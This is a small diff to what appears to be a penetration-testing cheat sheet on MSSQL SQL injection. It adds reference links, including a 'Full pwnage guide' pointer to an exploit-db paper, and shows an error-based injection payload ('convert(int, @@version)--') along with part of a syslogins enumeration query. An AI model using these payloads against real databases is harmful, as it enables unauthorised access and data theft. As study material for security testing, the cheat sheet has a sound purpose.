@@ -90,10 +90,14 @@ SELECT TOP 1 name FROM (SELECT TOP 9 name FROM master..syslogins ORDER BY name A
 
 ## Error-based
 
+Refer: [https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/](https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/)
+
 ```bash
 # encode + as %2b if doing url-based.
 # force the query to run and show output in error page
 convert(int, @@version)--
 ```
 
-{% embed url="https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/" %}
+## Full pwnage guide
+
+* [https://www.exploit-db.com/papers/12975](https://www.exploit-db.com/papers/12975)
